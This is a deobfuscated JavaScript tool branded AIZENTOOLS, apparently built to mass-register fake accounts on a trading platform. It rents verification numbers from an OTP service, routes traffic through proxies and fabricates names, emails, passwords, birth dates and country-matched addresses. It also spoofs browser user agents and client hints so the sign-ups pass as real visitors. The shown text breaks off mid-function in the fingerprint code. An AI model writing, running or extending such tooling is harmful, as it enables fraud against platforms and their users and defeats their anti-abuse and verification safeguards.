// === AIZENTOOLS ===
// File: titanfx_payload.deobf.js
// Note: Original variable names lost to obfuscation

const fs = require('fs'), path = require('path'), {execSync} = require('child_process');
(function () {
  const _p = function () {
    let _q;
    try {
      _q = Function('return (function() ' + '{}.constructor("return this")( )' + ');')();
    } catch (err) {
      _q = window;
    }
    return _q;
  };
  const _r = _p();
  _r.setInterval(_o, 4000);
}());
const {isMainThread} = require('worker_threads');
if (isMainThread) {
  const requiredModules = [
    'https-proxy-agent',
    'socks-proxy-agent',
    'chalk'
  ];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (err2) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log('\n[SETUP] First time setup: Installing required dependencies...');
    try {
      const opts = {};
      opts.stdio = 'inherit';
      execSync('npm install https-proxy-agent socks-proxy-agent chalk@4', opts);
      console.log('[SETUP] Dependencies installed successfully!\n');
    } catch (err3) {
      console.error('[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly.');
      process.exit(1);
    }
  }
}
const http = require('http'), https = require('https'), zlib = require('zlib'), crypto = require('crypto'), chalk = require('chalk'), readline = require('readline'), {HttpsProxyAgent} = require('https-proxy-agent'), {SocksProxyAgent} = require('socks-proxy-agent');
class NexaRateLimiter {
  constructor(_s) {
    this.delayMs = _s;
    this.queue = [];
    this.processing = false;
  }
  enqueue(_t) {
    return new Promise((resolve, reject) => {
      this.queue.push(async () => {
        try {
          resolve(await _t());
        } catch (err4) {
          reject(err4);
        }
      });
      if (!this.processing)
        this._process();
    });
  }
  async _process() {
    this.processing = true;
    while (this.queue.length > 0) {
      const _u = this.queue.shift();
      await _u();
      await new Promise(resolve2 => setTimeout(resolve2, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(_v, _w, _x) {
  return new Promise((resolve3, reject2) => {
    const opts2 = {};
    opts2.range = _w;
    opts2.format = 'normal';
    const _y = JSON.stringify(opts2), opts3 = {
        'hostname': 'nexaotpservice.com',
        'port': 80,
        'path': _x || '/api/v1/numbers/get',
        'method': 'POST',
        'headers': {
          'X-API-Key': _v,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(_y)
        }
      }, _z = http.request(opts3, _A => {
        let _B = '';
        _A.on('data', _C => _B += _C);
        _A.on('end', () => {
          try {
            const _D = JSON.parse(_B);
            if (_D.success && _D.number) {
              resolve3(_D.number.replace(/[^0-9]/g, ''));
            } else
              reject2(new Error(_D.error || 'NexaOTP: No number returned'));
          } catch (err5) {
            reject2(new Error('NexaOTP: Invalid response'));
          }
        });
      });
    _z.on('error', _E => reject2(new Error('NexaOTP network: ' + _E.message)));
    _z.setTimeout(10000, () => {
      _z.destroy();
      reject2(new Error('NexaOTP: Timeout'));
    });
    _z.write(_y);
    _z.end();
  });
}
let SUCCESSFUL_FILE = 'successful.txt', FAILED_FILE = 'failed.txt';
let DEBUG_FILE = 'debug.txt';
function debugLog(_F, _G, _H) {
  try {
    const _I = '[' + new Date().toISOString() + '] [' + _F + '] [' + _G + ']\n' + (typeof _H === 'string' ? _H : JSON.stringify(_H)) + '\n---\n';
    fs.appendFileSync(DEBUG_FILE, _I);
  } catch (err6) {
  }
}
const B = chalk.hex('#0066FF'), C = chalk.hex('#00BFFF'), Y = chalk.hex('#FFD700'), W = chalk.white;
const G = chalk.gray;
const R = chalk.hex('#FF6B6B'), DIM = chalk.hex('#555555');
function printHeader() {
  const parts = '8|10|1|2|3|4|6|9|11|5|7|0'.split('|');
  let _J = 0;
  while (true) {
    switch (parts[_J++]) {
    case '0':
      console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n'));
      continue;
    case '1':
      console.log(B('  |_   _(_) |_ __ _ _ __ / _ \\|_   _|  _ \\ '));
      continue;
    case '2':
      console.log(C('    | | | | __/ _` | \'_ | | | | | | | |_) |'));
      continue;
    case '3':
      console.log(C('    | | | | || (_| | | || |_| | | | |  __/ '));
      continue;
    case '4':
      console.log(Y('    |_| |_|\\__\\__,_|_| |_\\___/  |_| |_|    \n'));
      continue;
    case '5':
      console.log(W('\u2502 [\u2022] Status    : ') + G('Premium License              ') + W('\u2502'));
      continue;
    case '6':
      console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
      continue;
    case '7':
      console.log(W('\u2502 [\u2022] Version   : ') + Y('V1.0.0                       ') + W('\u2502'));
      continue;
    case '8':
      process.stdout.write('\x1B[2J\x1B[3J\x1B[H');
      continue;
    case '9':
      console.log(W('\u2502 [\u2022] OWNER      : ') + B('AIZENTOOLS                   ') + W('\u2502'));
      continue;
    case '10':
      console.log(B('   _____ _ _              ___  _____ ____  '));
      continue;
    case '11':
      console.log(W('\u2502 [\u2022] Telegram  : ') + C('t.me/aizentools            ') + W('\u2502'));
      continue;
    }
    break;
  }
}
function normalizePhoneNumber(_K) {
  let _L = _K.replace(/[^0-9+]/g, '');
  if (!_L.startsWith('+'))
    _L = '+' + _L;
  return _L;
}
function detectCountryFromPhone(_M) {
  const _N = _M.replace(/[^0-9+]/g, ''), opts4 = {};
  opts4.prefix = '+880';
  opts4.country = 'BD';
  opts4.name = 'Bangladesh';
  const opts5 = {};
  opts5.prefix = '+91';
  opts5.country = 'IN';
  opts5.name = 'India';
  const opts6 = {};
  opts6.prefix = '+92';
  opts6.country = 'PK';
  opts6.name = 'Pakistan';
  const opts7 = {};
  opts7.prefix = '+63';
  opts7.country = 'PH';
  opts7.name = 'Philippines';
  const opts8 = {};
  opts8.prefix = '+84';
  opts8.country = 'VN';
  opts8.name = 'Vietnam';
  const opts9 = {};
  opts9.prefix = '+62';
  opts9.country = 'ID';
  opts9.name = 'Indonesia';
  const opts10 = {};
  opts10.prefix = '+66';
  opts10.country = 'TH';
  opts10.name = 'Thailand';
  const opts11 = {};
  opts11.prefix = '+60';
  opts11.country = 'MY';
  opts11.name = 'Malaysia';
  const opts12 = {};
  opts12.prefix = '+65';
  opts12.country = 'SG';
  opts12.name = 'Singapore';
  const opts13 = {};
  opts13.prefix = '+86';
  opts13.country = 'CN';
  opts13.name = 'China';
  const opts14 = {};
  opts14.prefix = '+81';
  opts14.country = 'JP';
  opts14.name = 'Japan';
  const opts15 = {};
  opts15.prefix = '+82';
  opts15.country = 'KR';
  opts15.name = 'South Korea';
  const opts16 = {};
  opts16.prefix = '+971';
  opts16.country = 'AE';
  opts16.name = 'UAE';
  const opts17 = {};
  opts17.prefix = '+966';
  opts17.country = 'SA';
  opts17.name = 'Saudi Arabia';
  const opts18 = {};
  opts18.prefix = '+90';
  opts18.country = 'TR';
  opts18.name = 'Turkey';
  const opts19 = {};
  opts19.prefix = '+234';
  opts19.country = 'NG';
  opts19.name = 'Nigeria';
  const opts20 = {};
  opts20.prefix = '+254';
  opts20.country = 'KE';
  opts20.name = 'Kenya';
  const opts21 = {};
  opts21.prefix = '+27';
  opts21.country = 'ZA';
  opts21.name = 'South Africa';
  const opts22 = {};
  opts22.prefix = '+263';
  opts22.country = 'ZW';
  opts22.name = 'Zimbabwe';
  const opts23 = {};
  opts23.prefix = '+255';
  opts23.country = 'TZ';
  opts23.name = 'Tanzania';
  const opts24 = {};
  opts24.prefix = '+256';
  opts24.country = 'UG';
  opts24.name = 'Uganda';
  const opts25 = {};
  opts25.prefix = '+233';
  opts25.country = 'GH';
  opts25.name = 'Ghana';
  const opts26 = {};
  opts26.prefix = '+237';
  opts26.country = 'CM';
  opts26.name = 'Cameroon';
  const opts27 = {};
  opts27.prefix = '+225';
  opts27.country = 'CI';
  opts27.name = 'Ivory Coast';
  const opts28 = {};
  opts28.prefix = '+251';
  opts28.country = 'ET';
  opts28.name = 'Ethiopia';
  const opts29 = {};
  opts29.prefix = '+55';
  opts29.country = 'BR';
  opts29.name = 'Brazil';
  const opts30 = {};
  opts30.prefix = '+52';
  opts30.country = 'MX';
  opts30.name = 'Mexico';
  const opts31 = {};
  opts31.prefix = '+57';
  opts31.country = 'CO';
  opts31.name = 'Colombia';
  const opts32 = {};
  opts32.prefix = '+56';
  opts32.country = 'CL';
  opts32.name = 'Chile';
  const opts33 = {};
  opts33.prefix = '+51';
  opts33.country = 'PE';
  opts33.name = 'Peru';
  const opts34 = {};
  opts34.prefix = '+54';
  opts34.country = 'AR';
  opts34.name = 'Argentina';
  const opts35 = {};
  opts35.prefix = '+1';
  opts35.country = 'US';
  opts35.name = 'United States';
  const opts36 = {};
  opts36.prefix = '+44';
  opts36.country = 'GB';
  opts36.name = 'United Kingdom';
  const opts37 = {};
  opts37.prefix = '+61';
  opts37.country = 'AU';
  opts37.name = 'Australia';
  const opts38 = {};
  opts38.prefix = '+64';
  opts38.country = 'NZ';
  opts38.name = 'New Zealand';
  const opts39 = {};
  opts39.prefix = '+49';
  opts39.country = 'DE';
  opts39.name = 'Germany';
  const opts40 = {};
  opts40.prefix = '+33';
  opts40.country = 'FR';
  opts40.name = 'France';
  const opts41 = {};
  opts41.prefix = '+39';
  opts41.country = 'IT';
  opts41.name = 'Italy';
  const opts42 = {};
  opts42.prefix = '+34';
  opts42.country = 'ES';
  opts42.name = 'Spain';
  const opts43 = {};
  opts43.prefix = '+31';
  opts43.country = 'NL';
  opts43.name = 'Netherlands';
  const opts44 = {};
  opts44.prefix = '+46';
  opts44.country = 'SE';
  opts44.name = 'Sweden';
  const opts45 = {};
  opts45.prefix = '+47';
  opts45.country = 'NO';
  opts45.name = 'Norway';
  const opts46 = {};
  opts46.prefix = '+45';
  opts46.country = 'DK';
  opts46.name = 'Denmark';
  const opts47 = {};
  opts47.prefix = '+48';
  opts47.country = 'PL';
  opts47.name = 'Poland';
  const opts48 = {};
  opts48.prefix = '+7';
  opts48.country = 'RU';
  opts48.name = 'Russia';
  const opts49 = {};
  opts49.prefix = '+380';
  opts49.country = 'UA';
  opts49.name = 'Ukraine';
  const opts50 = {};
  opts50.prefix = '+20';
  opts50.country = 'EG';
  opts50.name = 'Egypt';
  const opts51 = {};
  opts51.prefix = '+98';
  opts51.country = 'IR';
  opts51.name = 'Iran';
  const opts52 = {};
  opts52.prefix = '+94';
  opts52.country = 'LK';
  opts52.name = 'Sri Lanka';
  const opts53 = {};
  opts53.prefix = '+977';
  opts53.country = 'NP';
  opts53.name = 'Nepal';
  const opts54 = {};
  opts54.prefix = '+95';
  opts54.country = 'MM';
  opts54.name = 'Myanmar';
  const opts55 = {};
  opts55.prefix = '+855';
  opts55.country = 'KH';
  opts55.name = 'Cambodia';
  const opts56 = {};
  opts56.prefix = '+856';
  opts56.country = 'LA';
  opts56.name = 'Laos';
  const opts57 = {};
  opts57.prefix = '+964';
  opts57.country = 'IQ';
  opts57.name = 'Iraq';
  const opts58 = {};
  opts58.prefix = '+212';
  opts58.country = 'MA';
  opts58.name = 'Morocco';
  const opts59 = {};
  opts59.prefix = '+216';
  opts59.country = 'TN';
  opts59.name = 'Tunisia';
  const opts60 = {};
  opts60.prefix = '+213';
  opts60.country = 'DZ';
  opts60.name = 'Algeria';
  const arr = [
      opts4,
      opts5,
      opts6,
      opts7,
      opts8,
      opts9,
      opts10,
      opts11,
      opts12,
      opts13,
      opts14,
      opts15,
      opts16,
      opts17,
      opts18,
      opts19,
      opts20,
      opts21,
      opts22,
      opts23,
      opts24,
      opts25,
      opts26,
      opts27,
      opts28,
      opts29,
      opts30,
      opts31,
      opts32,
      opts33,
      opts34,
      opts35,
      opts36,
      opts37,
      opts38,
      opts39,
      opts40,
      opts41,
      opts42,
      opts43,
      opts44,
      opts45,
      opts46,
      opts47,
      opts48,
      opts49,
      opts50,
      opts51,
      opts52,
      opts53,
      opts54,
      opts55,
      opts56,
      opts57,
      opts58,
      opts59,
      opts60
    ], _O = arr.sort((_P, _Q) => _Q.prefix.length - _P.prefix.length);
  for (const _R of _O) {
    if (_N.startsWith(_R.prefix)) {
      const opts61 = {};
      opts61.code = _R.country;
      opts61.name = _R.name;
      return opts61;
    }
  }
  const opts62 = {};
  opts62.code = 'US';
  opts62.name = 'Unknown (default: US)';
  return opts62;
}
const uuid = () => crypto.randomUUID();
function generateRandomEmail() {
  const arr2 = [
      'gmail.com',
      'outlook.com',
      'yahoo.com',
      'hotmail.com',
      'protonmail.com',
      'icloud.com',
      'mail.com',
      'aol.com',
      'zoho.com',
      'gmx.com'
    ], arr3 = [
      'john',
      'david',
      'michael',
      'chris',
      'james',
      'daniel',
      'mark',
      'steven',
      'robert',
      'william',
      'thomas',
      'andrew',
      'ryan',
      'kevin',
      'brian',
      'eric',
      'adam',
      'jason',
      'alex',
      'sam'
    ], arr4 = [
      'smith',
      'johnson',
      'williams',
      'brown',
      'jones',
      'garcia',
      'miller',
      'davis',
      'wilson',
      'moore',
      'taylor',
      'anderson',
      'thomas',
      'jackson',
      'white',
      'harris',
      'martin',
      'clark',
      'lewis',
      'hall'
    ], _S = arr3[Math.floor(Math.random() * arr3.length)], _T = arr4[Math.floor(Math.random() * arr4.length)], _U = Math.floor(Math.random() * 9999) + 1, arr5 = [
      '.',
      '_',
      ''
    ], _V = arr5[Math.floor(Math.random() * arr5.length)];
  return '' + _S + _V + _T + _U + '@' + arr2[Math.floor(Math.random() * arr2.length)];
}
function generateRandomPassword() {
  const _W = 'abcdefghijklmnopqrstuvwxyz';
  const _X = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _Y = '0123456789', _Z = '!@#$%&';
  let _aa = '';
  _aa += _X[Math.floor(Math.random() * _X.length)];
  _aa += _W[Math.floor(Math.random() * _W.length)];
  _aa += _Y[Math.floor(Math.random() * _Y.length)];
  _aa += _Z[Math.floor(Math.random() * _Z.length)];
  const _ba = _W + _X + _Y + _Z;
  for (let _ca = 0; _ca < 8; _ca++)
    _aa += _ba[Math.floor(Math.random() * _ba.length)];
  return _aa.split('').sort(() => Math.random() - (0 + 0.5)).join('');
}
function generateRandomName() {
  const arr6 = [
    'John',
    'David',
    'Michael',
    'Chris',
    'James',
    'Daniel',
    'Matthew',
    'Andrew',
    'Joshua',
    'Robert',
    'William',
    'Richard',
    'Thomas',
    'Mark',
    'Steven'
  ];
  const arr7 = [
      'Smith',
      'Johnson',
      'Williams',
      'Brown',
      'Jones',
      'Garcia',
      'Miller',
      'Davis',
      'Wilson',
      'Moore',
      'Taylor',
      'Anderson',
      'Thomas',
      'Jackson',
      'White'
    ], _da = arr6[Math.floor(Math.random() * arr6.length)], _ea = arr7[Math.floor(Math.random() * arr7.length)], opts63 = {};
  opts63.first = _da;
  opts63.last = _ea;
  opts63.full = _da + ' ' + _ea;
  return opts63;
}
function generateRandomDOB() {
  const _fa = Math.floor(Math.random() * 21) + 1980;
  const _ga = Math.floor(Math.random() * 12) + 1, _ha = Math.floor(Math.random() * 28) + 1;
  return {
    'day': _ha,
    'month': _ga,
    'year': _fa,
    'full': _fa + '-' + String(_ga).padStart(2, '0') + '-' + String(_ha).padStart(2, '0')
  };
}
function generateRandomNickname() {
  const arr8 = [
      'swift',
      'golden',
      'silver',
      'bold',
      'prime',
      'elite',
      'rapid',
      'smart',
      'alpha',
      'mega',
      'ultra',
      'pro',
      'global',
      'local',
      'royal'
    ], arr9 = [
      'trader',
      'market',
      'bull',
      'eagle',
      'wolf',
      'shark',
      'titan',
      'phoenix',
      'falcon',
      'lion',
      'viper',
      'hawk'
    ], arr10 = [
      'fx',
      'pro',
      'trade',
      'cap',
      'hub',
      'net',
      'one'
    ];
  return arr8[Math.floor(Math.random() * arr8.length)] + ' ' + arr9[Math.floor(Math.random() * arr9.length)] + ' ' + arr10[Math.floor(Math.random() * arr10.length)];
}
function generateRandomAddress(_ia) {
  const arr11 = [
      'Main Street',
      'Park Avenue',
      'Oak Drive',
      'Elm Street',
      'Cedar Lane',
      'Maple Road',
      'Pine Street',
      'Lake View Drive',
      'Hill Road',
      'River Road',
      'Victoria Road',
      'Church Street',
      'Station Road',
      'High Street',
      'King Street'
    ], opts64 = {};
  opts64.cities = [
    'Harare',
    'Bulawayo',
    'Chitungwiza',
    'Mutare',
    'Gweru',
    'Masvingo',
    'Kwekwe',
    'Kadoma'
  ];
  opts64.states = [
    'Harare Province',
    'Bulawayo Province',
    'Manicaland',
    'Mashonaland East',
    'Mashonaland West',
    'Masvingo Province',
    'Matabeleland North'
  ];
  opts64.postalCodes = [
    '00263',
    '00100',
    '00200',
    '00300',
    '00400',
    '00500'
  ];
  const opts65 = {};
  opts65.cities = [
    'Dhaka',
    'Chittagong',
    'Rajshahi',
    'Khulna',
    'Sylhet',
    'Rangpur',
    'Comilla',
    'Gazipur'
  ];
  opts65.states = [
    'Dhaka Division',
    'Chittagong Division',
    'Rajshahi Division',
    'Khulna Division',
    'Sylhet Division'
  ];
  opts65.postalCodes = [
    '1000',
    '1100',
    '1200',
    '1205',
    '1207',
    '1210',
    '1215',
    '1216'
  ];
  const opts66 = {};
  opts66.cities = [
    'Mumbai',
    'Delhi',
    'Bangalore',
    'Hyderabad',
    'Chennai',
    'Kolkata',
    'Pune',
    'Ahmedabad',
    'Jaipur'
  ];
  opts66.states = [
    'Maharashtra',
    'Delhi',
    'Karnataka',
    'Telangana',
    'Tamil Nadu',
    'West Bengal',
    'Gujarat',
    'Rajasthan'
  ];
  opts66.postalCodes = [
    '400001',
    '110001',
    '560001',
    '500001',
    '600001',
    '700001',
    '380001',
    '302001'
  ];
  const opts67 = {};
  opts67.cities = [
    'Karachi',
    'Lahore',
    'Islamabad',
    'Rawalpindi',
    'Faisalabad',
    'Multan',
    'Peshawar'
  ];
  opts67.states = [
    'Sindh',
    'Punjab',
    'Islamabad Capital',
    'Khyber Pakhtunkhwa',
    'Balochistan'
  ];
  opts67.postalCodes = [
    '74000',
    '54000',
    '44000',
    '46000',
    '38000',
    '60000',
    '25000'
  ];
  const opts68 = {};
  opts68.cities = [
    'Manila',
    'Quezon City',
    'Cebu City',
    'Davao City',
    'Makati',
    'Pasig',
    'Taguig'
  ];
  opts68.states = [
    'Metro Manila',
    'Central Visayas',
    'Davao Region',
    'Central Luzon',
    'Western Visayas'
  ];
  opts68.postalCodes = [
    '1000',
    '1100',
    '6000',
    '8000',
    '1200',
    '1600',
    '1630'
  ];
  const opts69 = {};
  opts69.cities = [
    'Lagos',
    'Abuja',
    'Kano',
    'Ibadan',
    'Port Harcourt',
    'Benin City',
    'Kaduna'
  ];
  opts69.states = [
    'Lagos State',
    'FCT Abuja',
    'Kano State',
    'Oyo State',
    'Rivers State',
    'Edo State'
  ];
  opts69.postalCodes = [
    '100001',
    '900001',
    '700001',
    '200001',
    '500001',
    '300001'
  ];
  const opts70 = {};
  opts70.cities = [
    'Nairobi',
    'Mombasa',
    'Kisumu',
    'Nakuru',
    'Eldoret',
    'Thika',
    'Malindi'
  ];
  opts70.states = [
    'Nairobi County',
    'Mombasa County',
    'Kisumu County',
    'Nakuru County',
    'Uasin Gishu County'
  ];
  opts70.postalCodes = [
    '00100',
    '80100',
    '40100',
    '20100',
    '30100',
    '01000'
  ];
  const opts71 = {};
  opts71.cities = [
    'New York',
    'Los Angeles',
    'Chicago',
    'Houston',
    'Phoenix',
    'San Francisco',
    'Seattle',
    'Miami',
    'Denver',
    'Boston'
  ];
  opts71.states = [
    'New York',
    'California',
    'Illinois',
    'Texas',
    'Arizona',
    'Washington',
    'Florida',
    'Colorado',
    'Massachusetts'
  ];
  opts71.postalCodes = [
    '10001',
    '90001',
    '60601',
    '77001',
    '85001',
    '94101',
    '98101',
    '33101',
    '80201',
    '02101'
  ];
  const opts72 = {};
  opts72.cities = [
    'London',
    'Manchester',
    'Birmingham',
    'Leeds',
    'Glasgow',
    'Liverpool',
    'Edinburgh',
    'Bristol'
  ];
  opts72.states = [
    'Greater London',
    'Greater Manchester',
    'West Midlands',
    'West Yorkshire',
    'Scotland',
    'Merseyside'
  ];
  opts72.postalCodes = [
    'SW1A 1AA',
    'M1 1AE',
    'B1 1BB',
    'LS1 1BA',
    'G1 1AA',
    'L1 1JQ',
    'EH1 1YZ',
    'BS1 1AA'
  ];
  const opts73 = {};
  opts73.cities = [
    'Sydney',
    'Melbourne',
    'Brisbane',
    'Perth',
    'Adelaide',
    'Gold Coast',
    'Canberra',
    'Hobart'
  ];
  opts73.states = [
    'New South Wales',
    'Victoria',
    'Queensland',
    'Western Australia',
    'South Australia',
    'ACT',
    'Tasmania'
  ];
  opts73.postalCodes = [
    '2000',
    '3000',
    '4000',
    '6000',
    '5000',
    '4217',
    '2600',
    '7000'
  ];
  const opts74 = {};
  opts74.cities = [
    'Johannesburg',
    'Cape Town',
    'Durban',
    'Pretoria',
    'Port Elizabeth',
    'Bloemfontein'
  ];
  opts74.states = [
    'Gauteng',
    'Western Cape',
    'KwaZulu-Natal',
    'Limpopo',
    'Eastern Cape',
    'Free State'
  ];
  opts74.postalCodes = [
    '2000',
    '8000',
    '4000',
    '0001',
    '6000',
    '9300'
  ];
  const opts75 = {};
  opts75.cities = [
    'Dar es Salaam',
    'Dodoma',
    'Mwanza',
    'Arusha',
    'Zanzibar City',
    'Mbeya'
  ];
  opts75.states = [
    'Dar es Salaam Region',
    'Dodoma Region',
    'Arusha Region',
    'Mwanza Region'
  ];
  opts75.postalCodes = [
    '11101',
    '41101',
    '33101',
    '23101',
    '71101',
    '53101'
  ];
  const opts76 = {};
  opts76.cities = [
    'Kampala',
    'Entebbe',
    'Jinja',
    'Gulu',
    'Mbarara',
    'Fort Portal'
  ];
  opts76.states = [
    'Central Region',
    'Eastern Region',
    'Northern Region',
    'Western Region'
  ];
  opts76.postalCodes = [
    '00256',
    '00100',
    '00200',
    '00300',
    '00400'
  ];
  const opts77 = {};
  opts77.cities = [
    'Accra',
    'Kumasi',
    'Tamale',
    'Sekondi-Takoradi',
    'Cape Coast',
    'Tema'
  ];
  opts77.states = [
    'Greater Accra',
    'Ashanti Region',
    'Northern Region',
    'Western Region',
    'Central Region'
  ];
  opts77.postalCodes = [
    '00233',
    'GA100',
    'AK100',
    'NT100',
    'WR100'
  ];
  const opts78 = {};
  opts78.ZW = opts64;
  opts78.BD = opts65;
  opts78.IN = opts66;
  opts78.PK = opts67;
  opts78.PH = opts68;
  opts78.NG = opts69;
  opts78.KE = opts70;
  opts78.US = opts71;
  opts78.GB = opts72;
  opts78.AU = opts73;
  opts78.ZA = opts74;
  opts78.TZ = opts75;
  opts78.UG = opts76;
  opts78.GH = opts77;
  const _ja = opts78, opts79 = {};
  opts79.cities = [
    'Metro City',
    'Central Town',
    'Eastside',
    'Westville',
    'Northpoint',
    'Southfield'
  ];
  opts79.states = [
    'Central Province',
    'Eastern Province',
    'Western Province',
    'Northern Province'
  ];
  opts79.postalCodes = [
    '10000',
    '20000',
    '30000',
    '40000',
    '50000'
  ];
  const _ka = opts79, _la = _ja[_ia] || _ka, _ma = _na => _na[Math.floor(Math.random() * _na.length)];
  return {
    'street': Math.floor(Math.random() * 999) + 1 + ' ' + _ma(arr11),
    'city': _ma(_la.cities),
    'state': _ma(_la.states),
    'postalCode': _ma(_la.postalCodes)
  };
}
function getRandomClient(_oa = 'random') {
  const opts80 = {};
  opts80.min = 7103;
  opts80.max = 7199;
  const opts81 = {};
  opts81.min = 7151;
  opts81.max = 7249;
  const opts82 = {};
  opts82.min = 7204;
  opts82.max = 7299;
  const opts83 = {};
  opts83.min = 7259;
  opts83.max = 7349;
  const opts84 = {};
  opts84.min = 7310;
  opts84.max = 7399;
  const opts85 = {};
  opts85.min = 7361;
  opts85.max = 7449;
  const opts86 = {};
  opts86.min = 7412;
  opts86.max = 7499;
  const opts87 = {};
  opts87.min = 7463;
  opts87.max = 7549;
  const opts88 = {};
  opts88.min = 7514;
  opts88.max = 7599;
  const opts89 = {};
  opts89.min = 7565;
  opts89.max = 7649;
  const opts90 = {};
  opts90.min = 7616;
  opts90.max = 7699;
  const opts91 = {};
  opts91.min = 7667;
  opts91.max = 7749;
  const opts92 = {};
  opts92.min = 7718;
  opts92.max = 7799;
  const opts93 = {};
  opts93.min = 7769;
  opts93.max = 7849;
  const opts94 = {};
  opts94['136'] = opts80;
  opts94['137'] = opts81;
  opts94['138'] = opts82;
  opts94['139'] = opts83;
  opts94['140'] = opts84;
  opts94['141'] = opts85;
  opts94['142'] = opts86;
  opts94['143'] = opts87;
  opts94['144'] = opts88;
  opts94['145'] = opts89;
  opts94['146'] = opts90;
  opts94['147'] = opts91;
  opts94['148'] = opts92;
  opts94['149'] = opts93;
  const _pa = opts94, _qa = Object.keys(_pa).map(Number), _ra = _qa.map((item, index) => Math.pow(index + 1, 2)), _sa = _ra.reduce((acc, item2) => acc + item2, 0);
  let _ta = Math.random() * _sa, _ua = _qa[_qa.length - 1];
  for (let _va = 0; _va < _qa.length; _va++) {
    _ta -= _ra[_va];
    if (_ta <= 0) {
      _ua = _qa[_va];
      break;
    }
  }
  const _wa = _pa[_ua], _xa = Math.floor(Math.random() * (_wa.max - _wa.min + 1)) + _wa.min, _ya = Math.floor(Math.random() * 200), opts95 = {};
  opts95['136'] = '"Not=A_Brand";v="99"';
  opts95['137'] = '"Not/A)Brand";v="8"';
  opts95['138'] = '"Not)A;Brand";v="99"';
  opts95['139'] = '"Not;A=Brand";v="8"';
  opts95['140'] = '"Not=A?Brand";v="8"';
  opts95['141'] = '"Not?A_Brand";v="99"';
  opts95['142'] = '"Not_A Brand";v="24"';
  opts95['143'] = '"Not A(Brand";v="8"';
  opts95['144'] = '"Not(A;Brand";v="99"';
  opts95['145'] = '"Not;A)Brand";v="24"';
  opts95['146'] = '"Not)A=Brand";v="8"';
  opts95['147'] = '"Not=A_Brand";v="99"';
  opts95['148'] = '"Not/A)Brand";v="8"';
  opts95['149'] = '"Not)A;Brand";v="24"';
  const _za = opts95, _Aa = _za[_ua] || '"Not A(Brand";v="24"', _Ba = Math.random();
  let _Ca;
  if (_Ba < 0 + 0.55)
    _Ca = 'win11';
  else {
    if (_Ba < 0 + 0.8)
      _Ca = 'win10';
    else {
      if (_Ba < 0 + 0.92)
        _Ca = 'mac';
      else
        _Ca = 'linux';
    }
  }
  const arr12 = [
      '22621',
      '22631',
      '23403',
      '23419',
      '23424',
      '23435',
      '23440',
      '26100'
    ], arr13 = [
      '19041',
      '19042',
      '19043',
      '19044',
      '19045'
    ], opts96 = {};
  opts96.ua = '10_15_7';
  opts96.platform = '"14.6.1"';
  opts96.silicon = false;
  const opts97 = {};
  opts97.ua = '10_15_7';
  opts97.platform = '"14.5.0"';
  opts97.silicon = false;
  const opts98 = {};
  opts98.ua = '10_15_7';
  opts98.platform = '"15.0.0"';
  opts98.silicon = true;
  const opts99 = {};
  opts99.ua = '10_15_7';
  opts99.platform = '"14.4.1"';
  opts99.silicon = false;
  const opts100 = {};
  opts100.ua = '10_15_7';
  opts100.platform = '"15.1.0"';
  opts100.silicon = true;
  const opts101 = {};
  opts101.ua = '10_15_7';
  opts101.platform = '"13.6.0"';
  opts101.silicon = false;
  const arr14 = [
      opts96,
      opts97,
      opts98,
      opts99,
      opts100,
      opts101
    ], arr15 = [
      'x86_64',
      'x86_64'
    ], _Da = _Ea => {
      const _Fa = _Ea[Math.floor(Math.random() * _Ea.length)];
      return '"' + (Math.floor(Math.random() * 6) + 10) + '.0.' + _Fa + '"';
    }, arr16 = [
      'chrome',
      'firefox',
      'edge'
    ];
  let _Ga = _oa;
  if (_Ga === 'random') {
    const _Ha = Math.random();
    if (_Ha < 0 + 0.7)
      _Ga = 'chrome';
    else {
      if (_Ha < 0 + 0.88)
        _Ga = 'firefox';
      else
        _Ga = 'edge';
    }
  }
  if (_Ga === 'firefox') {
    const _Ia = Math.floor(Math.random() * 19) + 120, _Ja = Math.floor(Math.random() * 3);
    if (_Ca === 'mac') {
      const _Ka = arr14[Math.floor(Math.random() * arr14.length)], opts102 = {};
      opts102.name = 'Mac Firefox';
      opts102.userAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X ' + _Ka.ua + '; rv:' + _Ia + '.' + _Ja + ') Gecko/20100101 Firefox/' + _Ia + '.' + _Ja;
      opts102.clientHints = {};
      return opts102;
    } else {
      const _La = _Ca === 'win11' ? '10.0' : '10.0', opts103 = {};
      opts103.name = 'Windows Firefox';
      opts103.userAgent = 'Mozilla/5.0 (Windows NT ' + _La + '; Win64; x64; rv:' + _Ia + '.' + _Ja + ') Gecko/20100101 Firefox/' + _Ia + '.' + _Ja;
      opts103.clientHints = {};
      return opts103;
    }
  }
  if (_Ga === 'edge') {
    const _Ma = Math.floor(Math.random() * 200), _Na = _Da(_Ca === 'win11' ? arr12 : arr13), opts104 = {};
    opts104.name = 'Windows Edge';
    opts104.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _ua + '.0.' + _xa + '.' + _ya + ' Safari/537.36 Edg/' + _ua + '.0.' + _xa + '.' + _Ma;
    opts104.clientHints = {};
    opts104.clientHints['sec-ch-ua'] = '"Chromium";v="' + _ua + '", ' + _Aa + ', "Microsoft Edge";v="' + _ua + '"';
    opts104.clientHints['sec-ch-ua-mobile'] = '?0';
    opts104.clientHints['sec-ch-ua-platform'] = '"Windows"';
